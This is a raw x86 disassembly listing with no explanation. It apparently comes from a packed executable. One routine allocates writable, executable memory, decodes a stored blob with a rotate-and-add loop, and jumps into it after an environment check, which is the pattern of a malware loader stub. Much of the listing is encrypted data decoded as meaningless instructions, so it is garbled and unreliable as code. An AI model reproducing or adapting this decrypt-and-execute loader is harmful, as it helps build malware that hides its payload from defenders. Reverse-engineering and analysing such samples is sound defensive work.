  42146e:	xlat   BYTE PTR es:[ebx]
  421470:	scas   eax,DWORD PTR es:[edi]
  421471:	push   es
  421472:	in     al,dx
  421473:	int    0x5e
  421475:	bnd js 0x42144f
  421478:	inc    edi
  421479:	cli    
  42147a:	(bad)  [edx]
  42147c:	(bad)  
  42147d:	add    BYTE PTR [eax-0x45],bh
  421480:	pop    ds
  421481:	lods   eax,DWORD PTR ds:[esi]
  421482:	in     eax,dx
  421483:	ret    
  421484:	push   ecx
  421485:	and    al,0x17
  421487:	pushf  
  421488:	lods   eax,DWORD PTR ds:[esi]
  421489:	test   BYTE PTR [edi-0x2f],ch
  42148c:	leave  
  42148d:	and    edi,DWORD PTR [esi-0x78]
  421490:	leave  
  421491:	adc    al,0x8b
  421493:	imul   esp,DWORD PTR [edi+0x52],0xffffffbb
  421497:	push   edx
  421498:	into   
  421499:	ret    0x8a
  42149c:	mov    ch,0x4e
  42149e:	(bad)  
  42149f:	sub    eax,esp
  4214a1:	cs lahf 
  4214a3:	and    ecx,esp
  4214a5:	int    0xfe
  4214a7:	adc    al,0xc2
  4214a9:	jnp    0x42142e
  4214ab:	pushf  
  4214ac:	ja     0x42143f
  4214ae:	dec    edx
  4214af:	ins    BYTE PTR es:[edi],dx
  4214b0:	inc    esi
  4214b1:	add    ch,BYTE PTR [ebx]
  4214b3:	xchg   ebx,eax
  4214b4:	outs   dx,DWORD PTR ds:[esi]
  4214b5:	cmp    ah,0xf1
  4214b8:	aad    0x8
  4214ba:	sub    ah,0x38
  4214bd:	dec    bl
  4214bf:	sbb    ebp,DWORD PTR [eax+esi*1]
  4214c2:	xchg   esi,eax
  4214c3:	icebp  
  4214c4:	jnp    0x42146c
  4214c6:	push   ds
  4214c7:	pop    ebx
  4214c8:	outs   dx,DWORD PTR ds:[esi]
  4214c9:	xor    eax,eax
  4214cb:	ret    
  4214cc:	nop
  4214cd:	nop
  4214ce:	nop
  4214cf:	nop
  4214d0:	push   ecx
  4214d1:	push   ebp
  4214d2:	mov    ebp,DWORD PTR [esp+0x10]
  4214d6:	xor    eax,eax
  4214d8:	test   ebp,ebp
  4214da:	push   esi
  4214db:	mov    DWORD PTR [esp+0x8],eax
  4214df:	mov    esi,0xfffffffd
  4214e4:	je     0x421546
  4214e6:	push   ebx
  4214e7:	push   edi
  4214e8:	mov    edi,DWORD PTR [esp+0x18]
  4214ec:	mov    DWORD PTR [esp+0x1c],0x1
  4214f4:	mov    cl,BYTE PTR [esi+ebp*1+0x3]
  4214f8:	add    esi,0x2
  4214fb:	inc    esi
  4214fc:	mov    BYTE PTR [esi+edi*1],cl
  4214ff:	mov    ecx,DWORD PTR [esp+0x24]
  421503:	movzx  ecx,BYTE PTR [eax+ecx*1]
  421507:	mov    edx,DWORD PTR [esp+0x10]
  42150b:	mov    eax,DWORD PTR [esp+0x1c]
  42150f:	add    edx,eax
  421511:	mov    DWORD PTR [esp+0x10],edx
  421515:	ror    eax,cl
  421517:	mov    eax,DWORD PTR [esp+0x10]
  42151b:	mov    edx,eax
  42151d:	shr    edx,0x3
  421520:	mov    ebx,0x1
  421525:	sub    ebx,edx
  421527:	imul   eax,ebx
  42152a:	mov    DWORD PTR [esp+0x10],eax
  42152e:	shl    ebx,0x3
  421531:	mov    bl,BYTE PTR [esi+edi*1]
  421534:	add    bl,cl
  421536:	mov    ecx,DWORD PTR [esp+0x20]
  42153a:	mov    BYTE PTR [esi+edi*1],bl
  42153d:	sub    esi,0x2
  421540:	cmp    esi,ecx
  421542:	jl     0x4214f4
  421544:	pop    edi
  421545:	pop    ebx
  421546:	pop    esi
  421547:	pop    ebp
  421548:	pop    ecx
  421549:	ret    
  42154a:	nop
  42154b:	nop
  42154c:	nop
  42154d:	nop
  42154e:	nop
  42154f:	nop
  421550:	push   ebp
  421551:	mov    ebp,esp
  421553:	sub    esp,0x78
  421556:	push   esi
  421557:	mov    DWORD PTR [ebp-0x50],0x0
  42155e:	mov    DWORD PTR [ebp-0x18],0x0
  421565:	mov    DWORD PTR [ebp-0x78],0x0
  42156c:	mov    DWORD PTR [ebp-0x68],0x0
  421573:	mov    DWORD PTR [ebp-0x8],0x0
  42157a:	mov    DWORD PTR [ebp-0x74],0x0
  421581:	mov    DWORD PTR [ebp-0x70],0x0
  421588:	mov    DWORD PTR [ebp-0x14],0x0
  42158f:	mov    DWORD PTR [ebp-0x54],0x0
  421596:	mov    DWORD PTR [ebp-0x10],0x0
  42159d:	mov    DWORD PTR [ebp-0x60],0x0
  4215a4:	mov    DWORD PTR [ebp-0x4],0x0
  4215ab:	mov    DWORD PTR [ebp-0x64],0x0
  4215b2:	mov    DWORD PTR [ebp-0x30],0x0
  4215b9:	mov    DWORD PTR [ebp-0x5c],0x0
  4215c0:	mov    DWORD PTR [ebp-0x2c],0x0
  4215c7:	mov    DWORD PTR [ebp-0x58],0x0
  4215ce:	mov    DWORD PTR [ebp-0xc],0x0
  4215d5:	mov    eax,ds:0x428108
  4215da:	mov    DWORD PTR [ebp-0x28],eax
  4215dd:	mov    ecx,DWORD PTR ds:0x42810c
  4215e3:	mov    DWORD PTR [ebp-0x24],ecx
  4215e6:	mov    edx,DWORD PTR ds:0x428110
  4215ec:	mov    DWORD PTR [ebp-0x20],edx
  4215ef:	mov    al,ds:0x428114
  4215f4:	mov    BYTE PTR [ebp-0x1c],al
  4215f7:	mov    ecx,DWORD PTR ds:0x4280f8
  4215fd:	mov    DWORD PTR [ebp-0x40],ecx
  421600:	mov    edx,DWORD PTR ds:0x4280fc
  421606:	mov    DWORD PTR [ebp-0x3c],edx
  421609:	mov    eax,ds:0x428100
  42160e:	mov    DWORD PTR [ebp-0x38],eax
  421611:	mov    cx,WORD PTR ds:0x428104
  421618:	mov    WORD PTR [ebp-0x34],cx
  42161c:	mov    dl,BYTE PTR ds:0x428106
  421622:	mov    BYTE PTR [ebp-0x32],dl
  421625:	mov    DWORD PTR [ebp-0x30],0x40
  42162c:	lea    eax,[ebp-0x10]
  42162f:	push   eax
  421630:	lea    ecx,[ebp-0x10]
  421633:	push   ecx
  421634:	lea    edx,[ebp-0x14]
  421637:	push   edx
  421638:	call   DWORD PTR ds:0x428000
  42163e:	test   eax,eax
  421640:	je     0x42164b
  421642:	mov    eax,DWORD PTR [ebp-0x10]
  421645:	add    eax,0x1
  421648:	mov    DWORD PTR [ebp-0x10],eax
  42164b:	mov    DWORD PTR [ebp-0x48],0x0
  421652:	mov    DWORD PTR [ebp-0x4c],0x0
  421659:	push   0x1
  42165b:	lea    ecx,[ebp-0x14]
  42165e:	push   ecx
  42165f:	call   DWORD PTR ds:0x428004
  421665:	mov    BYTE PTR [ebp-0x40],0x56
  421669:	call   DWORD PTR ds:0x428014
  42166f:	mov    DWORD PTR [ebp-0x2c],eax
  421672:	mov    BYTE PTR [ebp-0x3e],0x72
  421676:	movzx  edx,WORD PTR [ebp-0x2c]
  42167a:	test   edx,edx
  42167c:	jne    0x4216be
  42167e:	mov    BYTE PTR [ebp-0x34],0x0
  421682:	mov    DWORD PTR [ebp-0x14],0xe0d
  421689:	lea    eax,[ebp-0x28]
  42168c:	push   eax
  42168d:	call   DWORD PTR ds:0x428018
  421693:	mov    DWORD PTR [ebp-0x68],eax
  421696:	mov    DWORD PTR [ebp-0x5c],0x3a
  42169d:	lea    ecx,[ebp-0x40]
  4216a0:	push   ecx
  4216a1:	mov    edx,DWORD PTR [ebp-0x68]
  4216a4:	push   edx
  4216a5:	call   DWORD PTR ds:0x42801c
  4216ab:	mov    DWORD PTR [ebp-0x44],eax
  4216ae:	mov    DWORD PTR [ebp-0x8],0x12e924e
  4216b5:	mov    DWORD PTR [ebp-0x70],0x10c93f
  4216bc:	jmp    0x4216d3
  4216be:	mov    BYTE PTR ds:0x443a58,0x0
  4216c5:	mov    BYTE PTR ds:0x42bb88,0x0
  4216cc:	mov    BYTE PTR ds:0x441b18,0x0
  4216d3:	mov    DWORD PTR [ebp-0x2c],0x410000
  4216da:	push   DWORD PTR ds:0x428018
  4216e0:	pop    edx
  4216e1:	mov    DWORD PTR [ebp-0x74],edx
  4216e4:	push   DWORD PTR [ebp-0x30]
  4216e7:	push   0x1000
  4216ec:	mov    eax,DWORD PTR [ebp-0x14]
  4216ef:	add    eax,0x23
  4216f2:	add    eax,0x23
  4216f5:	push   eax
  4216f6:	xor    eax,eax
  4216f8:	push   eax
  4216f9:	mov    ecx,DWORD PTR [ebp-0x44]
  4216fc:	call   ecx
  4216fe:	mov    edx,eax
  421700:	mov    DWORD PTR [ebp-0x4],edx
  421703:	mov    eax,DWORD PTR [ebp-0x70]
  421706:	sub    eax,0xdae0b
  42170b:	mov    DWORD PTR [ebp-0x70],eax
  42170e:	cmp    DWORD PTR [ebp-0x4],0x0
  421712:	jne    0x42171b
  421714:	mov    BYTE PTR ds:0x441b18,0x0
  42171b:	mov    ecx,DWORD PTR [ebp-0x4]
  42171e:	add    ecx,DWORD PTR [ebp-0x14]
  421721:	mov    edx,DWORD PTR [ebp-0x8]
  421724:	mov    DWORD PTR [ecx],edx
  421726:	mov    eax,DWORD PTR [ebp-0x4]
  421729:	add    eax,DWORD PTR [ebp-0x5c]
  42172c:	mov    DWORD PTR [ebp-0x64],eax
  42172f:	mov    ecx,DWORD PTR ds:0x42801c
  421735:	mov    DWORD PTR [ebp-0x54],ecx
  421738:	mov    edx,DWORD PTR [ebp-0x4]
  42173b:	add    edx,DWORD PTR [ebp-0x14]
  42173e:	mov    eax,DWORD PTR [ebp+0x8]
  421741:	mov    DWORD PTR [edx+0x4],eax
  421744:	mov    ecx,DWORD PTR [ebp-0x4]
  421747:	add    ecx,DWORD PTR [ebp-0x14]
  42174a:	mov    DWORD PTR [ebp-0xc],ecx
  42174d:	cmp    DWORD PTR [ebp-0x70],0x0
  421751:	jbe    0x42176e
  421753:	mov    edx,DWORD PTR [ebp-0xc]
  421756:	push   edx
  421757:	mov    eax,DWORD PTR [ebp-0x14]
  42175a:	push   eax
  42175b:	mov    ecx,DWORD PTR [ebp-0x2c]
  42175e:	add    ecx,DWORD PTR [ebp-0x70]
  421761:	push   ecx
  421762:	mov    edx,DWORD PTR [ebp-0x4]
  421765:	push   edx
  421766:	call   0x4214d0
  42176b:	add    esp,0x10
  42176e:	cmp    DWORD PTR [ebp-0x64],0x0
  421772:	je     0x421786
  421774:	mov    ecx,DWORD PTR [ebp-0x54]
  421777:	push   ecx
  421778:	push   DWORD PTR [ebp-0x74]
  42177b:	mov    esi,DWORD PTR [ebp-0x64]
  42177e:	push   edx
  42177f:	pop    eax
  421780:	push   ecx
  421781:	nop
  421782:	jmp    esi
  421784:	jmp    0x42178c
  421786:	mov    eax,DWORD PTR [ebp+0x8]
  421789:	mov    DWORD PTR [ebp-0x18],eax
  42178c:	mov    eax,0x1
  421791:	pop    esi
  421792:	mov    esp,ebp
  421794:	pop    ebp
  421795:	ret    
  421796:	int3   
  421797:	int3   
  421798:	int3   
  421799:	int3   
  42179a:	int3   
  42179b:	int3   
  42179c:	int3   
  42179d:	int3   
  42179e:	int3   
  42179f:	int3   
  4217a0:	push   ebp
  4217a1:	mov    ebp,esp
  4217a3:	sub    esp,0x8
  4217a6:	mov    eax,ds:0x428014
  4217ab:	push   0x0
  4217ad:	push   0xb2
  4217b2:	push   0x82
  4217b7:	push   0x0
  4217b9:	push   0xffffffff
  4217bb:	mov    DWORD PTR [ebp-0x4],0x0
  4217c2:	mov    DWORD PTR [ebp-0x8],eax
  4217c5:	call   DWORD PTR ds:0x428010
  4217cb:	push   DWORD PTR [ebp-0x8]
  4217ce:	pop    edx
  4217cf:	call   edx
  4217d1:	push   eax
  4217d2:	pop    DWORD PTR [ebp-0x4]
  4217d5:	mov    eax,DWORD PTR [ebp-0x4]
  4217d8:	dec    eax
  4217d9:	cmp    eax,0x56
  4217dc:	jne    0x4217eb
  4217de:	push   0x9a14d4eb
  4217e3:	call   0x421550
  4217e8:	add    esp,0x4
  4217eb:	xor    eax,eax
  4217ed:	mov    esp,ebp
  4217ef:	pop    ebp
  4217f0:	ret    
  4217f1:	nop
  4217f2:	nop
  4217f3:	nop
  4217f4:	nop
  4217f5:	nop
  4217f6:	nop
  4217f7:	nop
  4217f8:	nop
  4217f9:	nop
  4217fa:	nop
  4217fb:	nop
  4217fc:	nop
  4217fd:	nop
  4217fe:	nop
  4217ff:	nop
  421800:	sub    esp,0x10
  421803:	lea    eax,[esp+0x0]
  421807:	push   eax
  421808:	call   DWORD PTR ds:0x42800c
  42180e:	cmp    WORD PTR [esp+0x0],0x0
  421814:	je     0x42182d
  421816:	push   0x0
  421818:	call   0x4217a0
  42181d:	add    esp,0x4
  421820:	call   0x411000
  421825:	xor    eax,eax
  421827:	add    esp,0x10
  42182a:	ret    0x10
  42182d:	call   DWORD PTR [ecx-0x7e]
  421830:	shl    BYTE PTR [edi],0xe8
  421833:	jp     0x4217c8
  421835:	jmp    0xe370:0x187ea8f8
  42183c:	fcom   DWORD PTR [eax-0x61]
  42183f:	jmp    0x4218bb
  421841:	xchg   ebx,eax
  421842:	jmp    0x1c8f:0x587ea8fc
  421849:	fcom   DWORD PTR [eax+0x27]
  42184c:	jmp    0x4218c8
  42184e:	xchg   ebx,eax
  42184f:	jmp    0x1c8f:0x187ea8fc
  421856:	fcom   DWORD PTR [eax+0x27]
  421859:	jmp    0x4218d5
  42185b:	xchg   ebx,eax
  42185c:	jmp    0x1c8f:0x187ea8fc
  421863:	fcom   DWORD PTR [eax+0x27]
  421866:	jmp    0x4218e2
  421868:	xchg   ebx,eax
  421869:	jmp    0x381:0x187ea804
  421870:	bound  ebx,QWORD PTR [esi+0x27]
  421873:	pop    edi
  421874:	jae    0x4218d4
  421876:	retf   
  421877:	inc    esp
  421878:	test   eax,0x48aed532
  42187d:	mov    al,0x39
  42187f:	push   esp
  421880:	retf   
  421881:	or     ah,cl
  421883:	test   DWORD PTR [ebx-0x508ae026],ebx
  421889:	jg     0x421844
  42188b:	ds dec ecx
  42188d:	test   BYTE PTR [esi],cl
  42188f:	mov    bl,0x88
  421891:	cdq    
  421892:	mov    BYTE PTR [ebp*2+0x3eb13ce1],cl
  421899:	pop    es
  42189a:	scas   eax,DWORD PTR es:[edi]
  42189b:	xor    eax,0xc791cac0
  4218a0:	sbb    bh,BYTE PTR [ebp-0x5f]
  4218a3:	adc    ebp,edx
  4218a5:	pop    edx
  4218a6:	add    ebp,ebx
  4218a8:	jp     0x42183d
  4218aa:	jmp    0xe016:0x1f7ea8fc
  4218b1:	adc    DWORD PTR [ebx],0xd07079df
  4218b7:	adc    ch,BYTE PTR [esi-0x5e]
  4218ba:	cmp    eax,0x80161de0
  4218bf:	xor    eax,0x6b25e12b
  4218c4:	js     0x4218bc
  4218c6:	lock sbb esp,DWORD PTR [eax]
  4218c9:	test   esi,ebx
  4218cb:	and    dl,al
  4218cd:	sub    eax,0xe0aa1fb3
  4218d2:	xchg   esp,eax
  4218d3:	push   eax
  4218d4:	in     al,dx
  4218d5:	adc    ah,BYTE PTR [ebx+0x615ae192]
  4218db:	adc    ebp,eax
  4218dd:	cdq    
  4218de:	mov    al,ds:0x5274b97c
  4218e3:	ja     0x421873
  4218e5:	rcr    BYTE PTR [edx],cl
  4218e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4218e8:	jmp    0x3da2:0x6e12cb70
  4218ef:	loopne 0x42190d
  4218f1:	push   ss
  4218f2:	lock test eax,0x4bc5e1b5
  4218f8:	push   0xfffffff6
  4218fa:	in     eax,0x86
  4218fc:	mov    al,BYTE PTR [ebp+0x2d6dbd44]
  421902:	jecxz  0x421886
  421904:	add    eax,esp
  421906:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421907:	int    0x76
  421909:	adc    cl,ch
  42190b:	in     al,0x4a
  42190d:	pop    edx
  42190e:	jg     0x42189e
  421910:	jne    0x4218ab
  421912:	test   al,0x4
  421914:	cmp    dh,BYTE PTR [edx+ecx*2-0x1a]
  421918:	jg     0x4218ca
  42191a:	adc    ebx,edi
  42191c:	jns    0x42198e
  42191e:	xchg   ebx,eax
  42191f:	jmp    0x1c8f:0x187ea8fc
  421926:	mov    BYTE PTR ds:0x9236eb27,dl
  42192c:	call   0x73f0222d
  421931:	rcr    BYTE PTR [eax+ebx*8],0x50
  421935:	daa    
  421936:	jmp    0x4219b2
  421938:	xchg   ebx,eax
  421939:	jmp    0x1d84:0x197da81c
  421940:	rcl    BYTE PTR [eax+0x27],cl
  421943:	add    eax,0x40ea937e
  421948:	scas   al,BYTE PTR es:[edi]
  421949:	jle    0x421963
  42194b:	(bad)  
  42194c:	sbb    al,0xd8
  42194e:	inc    ecx
  42194f:	call   0xa8fc:0xfa937aeb
  421956:	jle    0x421970
  421958:	mov    bl,BYTE PTR [eax+ebx*8]
  42195b:	push   eax
  42195c:	data16 jmp 0x4219d9
  42195f:	sub    edx,0xfffffffc
  421962:	test   al,0x7c
  421964:	sbb    BYTE PTR [edi+0x2751d819],cl
  42196a:	jmp    0x4219e6
  42196c:	xchg   ebx,eax
  42196d:	jmp    0x1c8f:0x187fa8f9
  421974:	fcom   DWORD PTR [eax+0x27]
  421977:	mov    ebx,0xf8ea9376
  42197c:	test   al,0x7e
  42197e:	sbb    DWORD PTR [ebx+0x19],ebp
  421981:	fcom   DWORD PTR [edx+0x27]
  421984:	jmp    0x421980
  421986:	xchg   ebx,eax
  421987:	jmp    0x1c8f:0x87ea8ec
  42198e:	fcom   DWORD PTR [eax+0x37]
  421991:	jmp    0x421a0d
  421993:	sub    edx,0xfffffffc
  421996:	test   al,0x7e
  421998:	sbb    BYTE PTR [edi+0x2750d80c],cl
  42199e:	jmp    0x421a1a
  4219a0:	xchg   ebx,eax
  4219a1:	jmp    0x257b:0x187ea8fc
  4219a8:	aam    0x50
  4219aa:	dec    esi
  4219ab:	call   0xd2cad2a
  4219b0:	mov    ds:0x1cc6577e,eax
  4219b5:	fcom   DWORD PTR [eax+0x27]
  4219b8:	jmp    0x421a34
  4219ba:	xchg   ebx,eax
  4219bb:	jmp    0x1c8f:0x187ea8fc
  4219c2:	fcom   DWORD PTR [eax+0x27]
  4219c5:	jmp    0x421a41
  4219c7:	xchg   ebx,eax
  4219c8:	jmp    0x1c8f:0x187ea8fc
  4219cf:	fcom   DWORD PTR [eax+0x27]
  4219d2:	jmp    0x421a4e
  4219d4:	xchg   ebx,eax
  4219d5:	jmp    0x1c8f:0x187ea8fc
  4219dc:	fcom   DWORD PTR [eax+0x27]
  4219df:	jmp    0x421a5b
  4219e1:	xchg   ebx,eax
  4219e2:	jmp    0x1c8f:0x187ea8fc
  4219e9:	fcom   DWORD PTR [eax+0x27]
  4219ec:	jmp    0x421a68
  4219ee:	xchg   ebx,eax
  4219ef:	jmp    0x1c8f:0x187ea8fc
  4219f6:	fcom   DWORD PTR [eax+0x27]
  4219f9:	jmp    0x421a75
  4219fb:	xchg   ebx,eax
  4219fc:	jmp    0x1c8f:0x187ea8fc
  421a03:	fcom   DWORD PTR [eax+0x27]
  421a06:	jmp    0x421a82
  421a08:	xchg   ebx,eax
  421a09:	jmp    0x1c8f:0x187ea8fc
  421a10:	fcom   DWORD PTR [eax+0x27]
  421a13:	jmp    0x421a8f
  421a15:	xchg   ebx,eax
  421a16:	jmp    0x1c8f:0x187ea8fc
  421a1d:	fdivr  DWORD PTR [esi+0x53]
  421a20:	mov    es,WORD PTR [edx]
  421a22:	out    0xea,eax
  421a24:	cld    
  421a25:	test   al,0x7e
  421a27:	clc    
  421a28:	test   BYTE PTR [eax+ebx*8],bl
  421a2b:	inc    eax
  421a2c:	daa    
  421a2d:	jmp    0x421aa9
  421a2f:	inc    edi
  421a30:	out    dx,al
  421a31:	cld    
  421a32:	test   al,0x7a
  421a34:	sbb    BYTE PTR [edi+0x15139d4c],cl
  421a3a:	mov    edi,0xfcea9335
  421a3f:	test   al,0x7e
  421a41:	sbb    BYTE PTR [edi+0x9b0d81c],ch
  421a47:	cdq    
  421a48:	or     ecx,esp
  421a4a:	mov    esp,edi
  421a4c:	test   al,0x7e
  421a4e:	sbb    bh,ch
  421a50:	sbb    al,0xd8
  421a52:	push   eax
  421a53:	xlat   BYTE PTR ds:[ebx]
  421a54:	loopne 0x421ad0
  421a56:	xchg   ebx,eax
  421a57:	mov    al,0xfc
  421a59:	test   al,0x7e
  421a5b:	ror    BYTE PTR [ebx+0x2750d81c],0xeb
  421a62:	jp     0x4219f7
  421a64:	jmp    0x3c8f:0x187ea8fc
  421a6b:	fcom   DWORD PTR [eax-0x39]
  421a6e:	jmp    0x421aea
  421a70:	xchg   ebx,eax
  421a71:	jmp    0x1c8f:0x187ea8fc
  421a78:	fcom   DWORD PTR [eax+0x27]
  421a7b:	jmp    0x421af7
  421a7d:	xchg   ebx,eax
  421a7e:	jmp    0x1c8f:0x187ea8fc
  421a85:	fcom   DWORD PTR [eax+0x27]
  421a88:	jmp    0x421b04
  421a8a:	xchg   ebx,eax
  421a8b:	jmp    0x1c8f:0x187ea8fc
  421a92:	fcom   DWORD PTR [eax+0x27]
  421a95:	jmp    0x421b11
  421a97:	xchg   ebx,eax
  421a98:	jmp    0x1c8f:0x187ea8fc
  421a9f:	fcom   DWORD PTR [eax+0x27]
  421aa2:	jmp    0x421b1e
  421aa4:	xchg   ebx,eax
  421aa5:	jmp    0x1c8f:0x187ea8fc
  421aac:	fcom   DWORD PTR [eax+0x27]
  421aaf:	jmp    0x421b2b
  421ab1:	xchg   ebx,eax
  421ab2:	jmp    0x1c8f:0x187ea8fc
  421ab9:	fcom   DWORD PTR [eax+0x27]
  421abc:	jmp    0x421b38
  421abe:	xchg   ebx,eax
  421abf:	jmp    0x1c8f:0x187ea8fc
  421ac6:	fcom   DWORD PTR [eax+0x27]
  421ac9:	jmp    0x421b45
  421acb:	xchg   ebx,eax
  421acc:	jmp    0x1c8f:0x187ea8fc
  421ad3:	fcom   DWORD PTR [eax+0x27]
  421ad6:	jmp    0x421b52
  421ad8:	xchg   ebx,eax
  421ad9:	jmp    0x1c8f:0x187ea8fc
  421ae0:	fcom   DWORD PTR [eax+0x27]
  421ae3:	jmp    0x421b5f
  421ae5:	xchg   ebx,eax
  421ae6:	jmp    0x1c8f:0x187ea8fc
  421aed:	fcom   DWORD PTR [eax+0x27]
  421af0:	jmp    0x421b6c
  421af2:	xchg   ebx,eax
  421af3:	jmp    0x1c8f:0x187ea8fc
  421afa:	fcom   DWORD PTR [eax+0x27]
  421afd:	jmp    0x421b79
  421aff:	xchg   ebx,eax
  421b00:	jmp    0x1c8f:0x187ea8fc
  421b07:	fcom   DWORD PTR [eax+0x27]
  421b0a:	jmp    0x421b86
  421b0c:	xchg   ebx,eax
  421b0d:	jmp    0x1c8f:0x187ea8fc
  421b14:	fcom   DWORD PTR [eax+0x27]
  421b17:	jmp    0x421b93
  421b19:	xchg   ebx,eax
  421b1a:	jmp    0x1c8f:0x187ea8fc
  421b21:	fcom   DWORD PTR [eax+0x27]
  421b24:	jmp    0x421ba0
  421b26:	xchg   ebx,eax
  421b27:	jmp    0x1c8f:0x187ea8fc
  421b2e:	fcom   DWORD PTR [eax+0x27]
  421b31:	jmp    0x421bad
  421b33:	xchg   ebx,eax
  421b34:	jmp    0x1c8f:0x187ea8fc
  421b3b:	fcom   DWORD PTR [eax+0x27]
  421b3e:	jmp    0x421bba
  421b40:	xchg   ebx,eax
  421b41:	jmp    0x1c8f:0x187ea8fc
  421b48:	fcom   DWORD PTR [eax+0x27]
  421b4b:	jmp    0x421bc7
  421b4d:	xchg   ebx,eax
  421b4e:	jmp    0x1c8f:0x187ea8fc
  421b55:	fcom   DWORD PTR [eax+0x27]
  421b58:	jmp    0x421bd4
  421b5a:	xchg   ebx,eax
  421b5b:	jmp    0x1c8f:0x187ea8fc
  421b62:	fcom   DWORD PTR [eax+0x27]
  421b65:	jmp    0x421be1
  421b67:	xchg   ebx,eax
  421b68:	jmp    0x1c8f:0x187ea8fc
  421b6f:	fcom   DWORD PTR [eax+0x27]
  421b72:	jmp    0x421bee
  421b74:	xchg   ebx,eax
  421b75:	jmp    0x1c8f:0x187ea8fc
  421b7c:	fcom   DWORD PTR [eax+0x27]
  421b7f:	jmp    0x421bfb
  421b81:	xchg   ebx,eax
  421b82:	jmp    0x1c8f:0x187ea8fc
  421b89:	fcom   DWORD PTR [eax+0x27]
  421b8c:	jmp    0x421c08
  421b8e:	xchg   ebx,eax
  421b8f:	jmp    0x1c8f:0x187ea8fc
  421b96:	fcom   DWORD PTR [eax+0x27]
  421b99:	jmp    0x421c15
  421b9b:	xchg   ebx,eax
  421b9c:	jmp    0x1c8f:0x187ea8fc
  421ba3:	fcom   DWORD PTR [eax+0x27]
  421ba6:	jmp    0x421c22
  421ba8:	xchg   ebx,eax
  421ba9:	jmp    0x1c8f:0x187ea8fc
  421bb0:	fcom   DWORD PTR [eax+0x27]
  421bb3:	jmp    0x421c2f
  421bb5:	xchg   ebx,eax
  421bb6:	jmp    0x1c8f:0x187ea8fc
  421bbd:	fcom   DWORD PTR [eax+0x27]
  421bc0:	jmp    0x421c3c
  421bc2:	xchg   ebx,eax
  421bc3:	jmp    0x1c8f:0x187ea8fc
  421bca:	fcom   DWORD PTR [eax+0x27]
  421bcd:	jmp    0x421c49
  421bcf:	xchg   ebx,eax
  421bd0:	jmp    0x1c8f:0x187ea8fc
  421bd7:	fcom   DWORD PTR [eax+0x27]
  421bda:	jmp    0x421c56
  421bdc:	xchg   ebx,eax
  421bdd:	jmp    0x1c8f:0x187ea8fc
  421be4:	fcom   DWORD PTR [eax+0x27]
  421be7:	jmp    0x421c63
  421be9:	xchg   ebx,eax
  421bea:	jmp    0x1c8f:0x187ea8fc
  421bf1:	fcom   DWORD PTR [eax+0x27]
  421bf4:	jmp    0x421c70
  421bf6:	xchg   ebx,eax
  421bf7:	jmp    0x1c8f:0x187ea8fc
  421bfe:	fcom   DWORD PTR [eax+0x27]
  421c01:	jmp    0x421c7d
  421c03:	xchg   ebx,eax
  421c04:	jmp    0x1c8f:0x187ea8fc
  421c0b:	fcom   DWORD PTR [eax+0x27]
  421c0e:	jmp    0x421c8a
  421c10:	xchg   ebx,eax
  421c11:	jmp    0x1c8f:0x187ea8fc
  421c18:	fcom   DWORD PTR [eax+0x27]
  421c1b:	jmp    0x421c97
  421c1d:	xchg   ebx,eax
  421c1e:	jmp    0x1c8f:0x187ea8fc
  421c25:	fcom   DWORD PTR [eax+0x27]
  421c28:	jmp    0x421ca4
  421c2a:	xchg   ebx,eax
  421c2b:	jmp    0x1c84:0xb011a8fc
  421c32:	not    DWORD PTR [eax+0x27]
  421c35:	sti    
  421c36:	jp     0x421bcb
  421c38:	rcr    BYTE PTR [esi+0x72],0xf
  421c3c:	jle    0x421cae
  421c3e:	xor    DWORD PTR [esi-0x29],eax
  421c41:	ja     0x421c49
  421c43:	dec    esp
  421c44:	jnp    0x421c3f
  421c46:	dec    eax
  421c47:	cmp    eax,0x460b6918
  421c4c:	retf   
  421c4d:	loope  0x421bdf
  421c4f:	std    
  421c50:	pop    ss
  421c51:	ja     0x421cb3
  421c53:	jge    0x421cc3
  421c55:	push   eax
  421c56:	jp     0x421c77
  421c58:	and    esp,ecx
  421c5a:	arpl   WORD PTR [eax+0x5a],bp
  421c5d:	ins    DWORD PTR es:[edi],dx
  421c5e:	mov    cl,0xea
  421c60:	fisttp DWORD PTR [edi]
  421c62:	test   BYTE PTR [ebp-0x22],0x71
  421c66:	jno    0x421cca
  421c68:	sbb    dh,BYTE PTR [esi]
  421c6a:	outs   dx,BYTE PTR ds:[esi]
  421c6b:	and    cl,BYTE PTR [edx-0x5ca5890d]
  421c71:	ret    
  421c72:	iret   
  421c73:	sbb    eax,0x7075df7f
  421c78:	jl     0x421c08
  421c7a:	fmul   QWORD PTR [ebx]
  421c7c:	jno    0x421c67
  421c7e:	and    eax,0x61289d31
  421c83:	mov    edx,0xba5b5d39
  421c88:	add    DWORD PTR [ebx],0x3a460e85
  421c8e:	push   edi
  421c8f:	xchg   ebx,eax
  421c90:	imul   ecx,DWORD PTR [ecx-0x8],0x1f58dd0e
  421c97:	xchg   ebx,eax
  421c98:	out    dx,eax
  421c99:	mov    edx,0x40c07ccc
  421c9e:	push   edx
  421c9f:	fmul   DWORD PTR ds:0x476508c3
  421ca5:	cmp    eax,0x5cec9ea6
  421caa:	ret    0xbd38
  421cad:	adc    eax,0xafb299cd
  421cb2:	xor    BYTE PTR [edx+0x7a],0xe
  421cb6:	call   0xe169:0x2ed670c6
  421cbd:	icebp  
  421cbe:	sub    ebp,ebx
  421cc0:	shrd   edi,edx,0xf
  421cc4:	test   eax,0xd1571526
  421cc9:	pop    edx
  421cca:	je     0x421c60
  421ccc:	fiadd  WORD PTR [ebx+ebp*2]
  421ccf:	push   esi
  421cd0:	mov    BYTE PTR [ecx-0x439c7676],ah
  421cd6:	out    0x66,eax
  421cd8:	xor    al,0x39
  421cda:	mul    BYTE PTR [eax+0x2a]
  421cdd:	or     edi,DWORD PTR [ebp-0x75]
  421ce0:	sbb    al,0x80
  421ce2:	int3   
  421ce3:	mov    ebp,0x77fa1f54
  421ce8:	sub    ah,al
  421cea:	sbb    DWORD PTR [ecx-0x47],edi
  421ced:	pop    eax
  421cee:	push   ss
  421cef:	cmc    
  421cf0:	mov    dh,0xfc
  421cf2:	ficom  DWORD PTR [edx-0x58]
  421cf5:	sti    
  421cf6:	mov    edi,0x1cab3488
  421cfb:	ret    0x66aa
  421cfe:	mov    ds:0xe566988c,al
  421d03:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421d04:	sub    DWORD PTR [esi+ecx*4+0x577f933],ebp
  421d0b:	ret    
  421d0c:	pop    DWORD PTR [edi]
  421d0e:	pop    ds
